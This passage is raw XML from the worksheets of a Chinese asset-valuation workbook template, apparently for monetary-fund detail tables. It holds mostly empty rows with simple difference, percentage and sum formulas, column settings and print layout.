      <c r="C16" s="381" t="n"/>
      <c r="D16" s="198" t="n"/>
      <c r="E16" s="198" t="n"/>
      <c r="F16" s="568" t="n"/>
      <c r="G16" s="566" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555">
        <f>I16-H16</f>
        <v/>
      </c>
      <c r="K16" s="555">
        <f>IF(H16=0,"",J16/H16*100)</f>
        <v/>
      </c>
      <c r="L16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="198" t="n"/>
      <c r="E17" s="198" t="n"/>
      <c r="F17" s="568" t="n"/>
      <c r="G17" s="566" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555">
        <f>I17-H17</f>
        <v/>
      </c>
      <c r="K17" s="555">
        <f>IF(H17=0,"",J17/H17*100)</f>
        <v/>
      </c>
      <c r="L17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="198" t="n"/>
      <c r="E18" s="198" t="n"/>
      <c r="F18" s="568" t="n"/>
      <c r="G18" s="566" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555">
        <f>I18-H18</f>
        <v/>
      </c>
      <c r="K18" s="555">
        <f>IF(H18=0,"",J18/H18*100)</f>
        <v/>
      </c>
      <c r="L18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="198" t="n"/>
      <c r="E19" s="198" t="n"/>
      <c r="F19" s="568" t="n"/>
      <c r="G19" s="566" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555">
        <f>I19-H19</f>
        <v/>
      </c>
      <c r="K19" s="555">
        <f>IF(H19=0,"",J19/H19*100)</f>
        <v/>
      </c>
      <c r="L19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="198" t="n"/>
      <c r="E20" s="198" t="n"/>
      <c r="F20" s="568" t="n"/>
      <c r="G20" s="566" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555">
        <f>I20-H20</f>
        <v/>
      </c>
      <c r="K20" s="555">
        <f>IF(H20=0,"",J20/H20*100)</f>
        <v/>
      </c>
      <c r="L20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="198" t="n"/>
      <c r="E21" s="198" t="n"/>
      <c r="F21" s="568" t="n"/>
      <c r="G21" s="566" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555">
        <f>I21-H21</f>
        <v/>
      </c>
      <c r="K21" s="555">
        <f>IF(H21=0,"",J21/H21*100)</f>
        <v/>
      </c>
      <c r="L21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="198" t="n"/>
      <c r="E22" s="198" t="n"/>
      <c r="F22" s="568" t="n"/>
      <c r="G22" s="566" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555">
        <f>I22-H22</f>
        <v/>
      </c>
      <c r="K22" s="555">
        <f>IF(H22=0,"",J22/H22*100)</f>
        <v/>
      </c>
      <c r="L22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="198" t="n"/>
      <c r="E23" s="198" t="n"/>
      <c r="F23" s="568" t="n"/>
      <c r="G23" s="566" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555">
        <f>I23-H23</f>
        <v/>
      </c>
      <c r="K23" s="555">
        <f>IF(H23=0,"",J23/H23*100)</f>
        <v/>
      </c>
      <c r="L23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="198" t="n"/>
      <c r="E24" s="198" t="n"/>
      <c r="F24" s="568" t="n"/>
      <c r="G24" s="566" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555">
        <f>I24-H24</f>
        <v/>
      </c>
      <c r="K24" s="555">
        <f>IF(H24=0,"",J24/H24*100)</f>
        <v/>
      </c>
      <c r="L24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="198" t="n"/>
      <c r="E25" s="198" t="n"/>
      <c r="F25" s="568" t="n"/>
      <c r="G25" s="566" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555">
        <f>I25-H25</f>
        <v/>
      </c>
      <c r="K25" s="555">
        <f>IF(H25=0,"",J25/H25*100)</f>
        <v/>
      </c>
      <c r="L25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="198" t="n"/>
      <c r="E26" s="198" t="n"/>
      <c r="F26" s="568" t="n"/>
      <c r="G26" s="566" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555">
        <f>I26-H26</f>
        <v/>
      </c>
      <c r="K26" s="555">
        <f>IF(H26=0,"",J26/H26*100)</f>
        <v/>
      </c>
      <c r="L26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="198" t="n"/>
      <c r="E27" s="198" t="n"/>
      <c r="F27" s="568" t="n"/>
      <c r="G27" s="566" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555">
        <f>I27-H27</f>
        <v/>
      </c>
      <c r="K27" s="555">
        <f>IF(H27=0,"",J27/H27*100)</f>
        <v/>
      </c>
      <c r="L27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="198" t="n"/>
      <c r="E28" s="198" t="n"/>
      <c r="F28" s="568" t="n"/>
      <c r="G28" s="566" t="n"/>
      <c r="H28" s="555" t="n"/>
      <c r="I28" s="555" t="n"/>
      <c r="J28" s="555">
        <f>I28-H28</f>
        <v/>
      </c>
      <c r="K28" s="555">
        <f>IF(H28=0,"",J28/H28*100)</f>
        <v/>
      </c>
      <c r="L28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合             计</t>
        </is>
      </c>
      <c r="C29" s="567" t="n"/>
      <c r="D29" s="383" t="n"/>
      <c r="E29" s="383" t="n"/>
      <c r="F29" s="565" t="n"/>
      <c r="G29" s="233" t="n"/>
      <c r="H29" s="555">
        <f>ROUND(SUM(H6:H28),2)</f>
        <v/>
      </c>
      <c r="I29" s="555">
        <f>ROUND(SUM(I6:I28),2)</f>
        <v/>
      </c>
      <c r="J29" s="555">
        <f>I29-H29</f>
        <v/>
      </c>
      <c r="K29" s="555">
        <f>IF(H29=0,"",J29/H29*100)</f>
        <v/>
      </c>
      <c r="L29" s="383" t="n"/>
    </row>
    <row r="30" s="415">
      <c r="B30" s="237" t="n"/>
      <c r="C30" s="342" t="n"/>
      <c r="D30" s="342" t="n"/>
      <c r="E30" s="342" t="n"/>
      <c r="F30" s="342" t="n"/>
      <c r="G30" s="342" t="n"/>
      <c r="H30" s="342" t="n"/>
      <c r="I30" s="342" t="n"/>
      <c r="J30" s="342" t="n"/>
      <c r="K30" s="342" t="n"/>
      <c r="L30" s="342" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B1:L1"/>
    <mergeCell ref="B29:C29"/>
    <mergeCell ref="K3:L3"/>
    <mergeCell ref="B2:K2"/>
  </mergeCells>
  <conditionalFormatting sqref="B6:L29">
    <cfRule type="expression" priority="1" dxfId="3">
      <formula>_xlfn.ISFORMULA(B6)</formula>
    </cfRule>
  </conditionalFormatting>
  <printOptions horizontalCentered="1"/>
  <pageMargins left="0.590277777777778" right="0.590277777777778" top="0.865972222222222" bottom="0.972222222222222" header="0.472222222222222" footer="0.590277777777778"/>
  <pageSetup orientation="landscape" paperSize="9" scale="93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Sheet13">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:L31"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A30"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="5.33333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="21.3333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="13.1666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="9.16666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col outlineLevel="1" width="12.1666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="12" customWidth="1" style="410" min="7" max="7"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="8.66666666666667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货币资金—其他货币资金评估明细表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402" t="inlineStr">
        <is>
          <t>表3-1-3</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.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402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="17.2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名称及内容</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>用途</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>币种</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>外币账面金额</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>评估基准日汇率</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="17.25" customFormat="1" customHeight="1" s="369">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="384" t="n"/>
      <c r="D6" s="185" t="n"/>
      <c r="E6" s="380" t="n"/>
      <c r="F6" s="569" t="n"/>
      <c r="G6" s="566" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555" t="n"/>
      <c r="J6" s="555">
        <f>I6-H6</f>
        <v/>
      </c>
      <c r="K6" s="555">
        <f>IF(H6=0,"",J6/H6*100)</f>
        <v/>
      </c>
      <c r="L6" s="380" t="n"/>
    </row>
    <row r="7" ht="17.25" customFormat="1" customHeight="1" s="369">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="384" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="380" t="n"/>
      <c r="F7" s="569" t="n"/>
      <c r="G7" s="566" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555">
        <f>I7-H7</f>
        <v/>
      </c>
      <c r="K7" s="555">
        <f>IF(H7=0,"",J7/H7*100)</f>
        <v/>
      </c>
      <c r="L7" s="380" t="n"/>
    </row>
    <row r="8" ht="17.25" customFormat="1" customHeight="1" s="369">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="384" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="569" t="n"/>
      <c r="G8" s="566" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555">
        <f>I8-H8</f>
        <v/>
      </c>
      <c r="K8" s="555">
        <f>IF(H8=0,"",J8/H8*100)</f>
        <v/>
      </c>
      <c r="L8" s="380" t="n"/>
    </row>
    <row r="9" customFormat="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="384" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="570" t="n"/>
      <c r="G9" s="566" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555">
        <f>I9-H9</f>
        <v/>
      </c>
      <c r="K9" s="555">
        <f>IF(H9=0,"",J9/H9*100)</f>
        <v/>
      </c>
      <c r="L9" s="383" t="n"/>
    </row>
    <row r="10" customFormat="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="384" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="570" t="n"/>
      <c r="G10" s="566" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555">
        <f>I10-H10</f>
        <v/>
      </c>
      <c r="K10" s="555">
        <f>IF(H10=0,"",J10/H10*100)</f>
        <v/>
      </c>
      <c r="L10" s="383" t="n"/>
    </row>
    <row r="11" customFormat="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="384" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="570" t="n"/>
      <c r="G11" s="566" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555">
        <f>I11-H11</f>
        <v/>
      </c>
      <c r="K11" s="555">
        <f>IF(H11=0,"",J11/H11*100)</f>
        <v/>
      </c>
      <c r="L11" s="383" t="n"/>
    </row>
    <row r="12" customFormat="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="384" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="570" t="n"/>
      <c r="G12" s="566" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555">
        <f>I12-H12</f>
        <v/>
      </c>
      <c r="K12" s="555">
        <f>IF(H12=0,"",J12/H12*100)</f>
        <v/>
      </c>
      <c r="L12" s="383" t="n"/>
    </row>
    <row r="13" customFormat="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="384" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="570" t="n"/>
      <c r="G13" s="566" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555">
        <f>I13-H13</f>
        <v/>
      </c>
      <c r="K13" s="555">
        <f>IF(H13=0,"",J13/H13*100)</f>
        <v/>
      </c>
      <c r="L13" s="383" t="n"/>
    </row>
    <row r="14" customFormat="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="384" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="570" t="n"/>
      <c r="G14" s="566" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555">
        <f>I14-H14</f>
        <v/>
      </c>
      <c r="K14" s="555">
        <f>IF(H14=0,"",J14/H14*100)</f>
        <v/>
      </c>
      <c r="L14" s="383" t="n"/>
    </row>
    <row r="15" customFormat="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="384" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="570" t="n"/>
      <c r="G15" s="566" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555">
        <f>I15-H15</f>
        <v/>
      </c>
      <c r="K15" s="555">
        <f>IF(H15=0,"",J15/H15*100)</f>
        <v/>
      </c>
      <c r="L15" s="383" t="n"/>
    </row>
    <row r="16" customFormat="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="384" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="570" t="n"/>
      <c r="G16" s="566" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555">
        <f>I16-H16</f>
        <v/>
      </c>
      <c r="K16" s="555">
        <f>IF(H16=0,"",J16/H16*100)</f>
        <v/>
      </c>
      <c r="L16" s="383" t="n"/>
    </row>
    <row r="17" customFormat="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="384" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="570" t="n"/>
      <c r="G17" s="566" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555">
        <f>I17-H17</f>
        <v/>
      </c>
      <c r="K17" s="555">
        <f>IF(H17=0,"",J17/H17*100)</f>
        <v/>
      </c>
      <c r="L17" s="383" t="n"/>
    </row>
    <row r="18" customFormat="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="384" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="570" t="n"/>
      <c r="G18" s="566" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555">
        <f>I18-H18</f>
        <v/>
      </c>
      <c r="K18" s="555">
        <f>IF(H18=0,"",J18/H18*100)</f>
        <v/>
      </c>
      <c r="L18" s="383" t="n"/>
    </row>
    <row r="19" customFormat="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="384" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="570" t="n"/>
      <c r="G19" s="566" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555">
        <f>I19-H19</f>
        <v/>
      </c>
      <c r="K19" s="555">
        <f>IF(H19=0,"",J19/H19*100)</f>
        <v/>
      </c>
      <c r="L19" s="383" t="n"/>
    </row>
    <row r="20" customFormat="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="384" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="570" t="n"/>
      <c r="G20" s="566" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555">
        <f>I20-H20</f>
        <v/>
      </c>
      <c r="K20" s="555">
        <f>IF(H20=0,"",J20/H20*100)</f>
        <v/>
      </c>
      <c r="L20" s="383" t="n"/>
    </row>
    <row r="21" customFormat="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="384" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="570" t="n"/>
      <c r="G21" s="566" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555">
        <f>I21-H21</f>
        <v/>
      </c>
      <c r="K21" s="555">
        <f>IF(H21=0,"",J21/H21*100)</f>
        <v/>
      </c>
      <c r="L21" s="383" t="n"/>
    </row>
    <row r="22" customFormat="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="384" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="570" t="n"/>
      <c r="G22" s="566" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555">
        <f>I22-H22</f>
        <v/>
      </c>
      <c r="K22" s="555">
        <f>IF(H22=0,"",J22/H22*100)</f>
        <v/>
      </c>
      <c r="L22" s="383" t="n"/>
    </row>
    <row r="23" customFormat="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="384" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="570" t="n"/>
      <c r="G23" s="566" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555">
        <f>I23-H23</f>
        <v/>
      </c>
      <c r="K23" s="555">
        <f>IF(H23=0,"",J23/H23*100)</f>
        <v/>
      </c>
      <c r="L23" s="383" t="n"/>
    </row>
    <row r="24" customFormat="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="384" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="570" t="n"/>
      <c r="G24" s="566" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555">
        <f>I24-H24</f>
        <v/>
      </c>
      <c r="K24" s="555">
        <f>IF(H24=0,"",J24/H24*100)</f>
        <v/>
      </c>
      <c r="L24" s="383" t="n"/>
    </row>
    <row r="25" customFormat="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="384" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="570" t="n"/>
      <c r="G25" s="566" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555">
        <f>I25-H25</f>
        <v/>
      </c>
      <c r="K25" s="555">
        <f>IF(H25=0,"",J25/H25*100)</f>
        <v/>
      </c>
      <c r="L25" s="383" t="n"/>
    </row>
    <row r="26" customFormat="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="384" t="n"/>
      <c r="D26" s="381" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="570" t="n"/>
      <c r="G26" s="566" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555">
        <f>I26-H26</f>
        <v/>
      </c>
      <c r="K26" s="555">
        <f>IF(H26=0,"",J26/H26*100)</f>
        <v/>
      </c>
      <c r="L26" s="383" t="n"/>
    </row>
    <row r="27" customFormat="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="384" t="n"/>
      <c r="D27" s="381" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="570" t="n"/>
      <c r="G27" s="566" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555">
        <f>I27-H27</f>
        <v/>
      </c>
      <c r="K27" s="555">
        <f>IF(H27=0,"",J27/H27*100)</f>
        <v/>
      </c>
      <c r="L27" s="383" t="n"/>
    </row>
    <row r="28" customFormat="1" s="116">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="384" t="n"/>
      <c r="D28" s="381" t="n"/>
      <c r="E28" s="380" t="n"/>
      <c r="F28" s="570" t="n"/>
      <c r="G28" s="566" t="n"/>
      <c r="H28" s="555" t="n"/>
      <c r="I28" s="555" t="n"/>
      <c r="J28" s="555">
        <f>I28-H28</f>
        <v/>
      </c>
      <c r="K28" s="555">
        <f>IF(H28=0,"",J28/H28*100)</f>
        <v/>
      </c>
      <c r="L28" s="383" t="n"/>
    </row>
    <row r="29" customFormat="1" s="116">
      <c r="A29" s="116" t="n"/>
      <c r="B29" s="380" t="n"/>
      <c r="C29" s="384" t="n"/>
      <c r="D29" s="381" t="n"/>
      <c r="E29" s="380" t="n"/>
      <c r="F29" s="570" t="n"/>
      <c r="G29" s="566" t="n"/>
      <c r="H29" s="555" t="n"/>
      <c r="I29" s="555" t="n"/>
      <c r="J29" s="555">
        <f>I29-H29</f>
        <v/>
      </c>
      <c r="K29" s="555">
        <f>IF(H29=0,"",J29/H29*100)</f>
        <v/>
      </c>
      <c r="L29" s="383" t="n"/>
    </row>
    <row r="30" customFormat="1" s="116">
      <c r="A30" s="116" t="n"/>
      <c r="B30" s="380" t="n"/>
      <c r="C30" s="384" t="n"/>
      <c r="D30" s="381" t="n"/>
      <c r="E30" s="380" t="n"/>
      <c r="F30" s="570" t="n"/>
      <c r="G30" s="566" t="n"/>
      <c r="H30" s="555" t="n"/>
      <c r="I30" s="555" t="n"/>
      <c r="J30" s="555">
        <f>I30-H30</f>
        <v/>
      </c>
      <c r="K30" s="555">
        <f>IF(H30=0,"",J30/H30*100)</f>
        <v/>
      </c>
      <c r="L30" s="383" t="n"/>
    </row>
    <row r="31" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A31" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B31" s="380" t="inlineStr">
        <is>
          <t>合             计</t>
        </is>
      </c>
      <c r="C31" s="567" t="n"/>
      <c r="D31" s="383" t="n"/>
      <c r="E31" s="383" t="n"/>
      <c r="F31" s="565" t="n"/>
      <c r="G31" s="383" t="n"/>
      <c r="H31" s="555">
        <f>ROUND(SUM(H6:H30),2)</f>
        <v/>
      </c>
      <c r="I31" s="555">
        <f>ROUND(SUM(I6:I30),2)</f>
        <v/>
      </c>
      <c r="J31" s="555">
        <f>I31-H31</f>
        <v/>
      </c>
      <c r="K31" s="555">
        <f>IF(H31=0,"",J31/H31*100)</f>
        <v/>
      </c>
      <c r="L31" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B2:L2"/>
    <mergeCell ref="B1:L1"/>
    <mergeCell ref="B31:C31"/>
  </mergeCells>
  <conditionalFormatting sqref="B6:L31">
    <cfRule type="expression" priority="1" dxfId="3">
      <formula>_xlfn.ISFORMULA(B6)</formula>
    </cfRule>
  </conditionalFormatting>
  <printOptions horizontalCentered="1"/>
  <pageMargins left="0.590277777777778" right="0.590277777777778" top="0.865972222222222" bottom="0.972222222222222" header="0.472222222222222" footer="0.590277777777778"/>
  <pageSetup orientation="landscape" paperSize="9" scale="93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codeName="Sheet14">
    <tabColor rgb="FF92D050"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:I25"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A24" sqref="A24"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="7.5" customWidth="1" style="410" min="2" max="2"/>
    <col hidden="1" width="7.5" customWidth="1" style="410" min="3" max="3"/>
    <col width="28" customWidth="1" style="410" min="4" max="4"/>
    <col width="20.1666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col outlineLevel="1" width="19.1666666666667" customWidth="1" style="410" min="6" max="7"/>
    <col outlineLevel="1" width="14.3333333333333" customWidth="1" style="410" min="8" max="8"/>
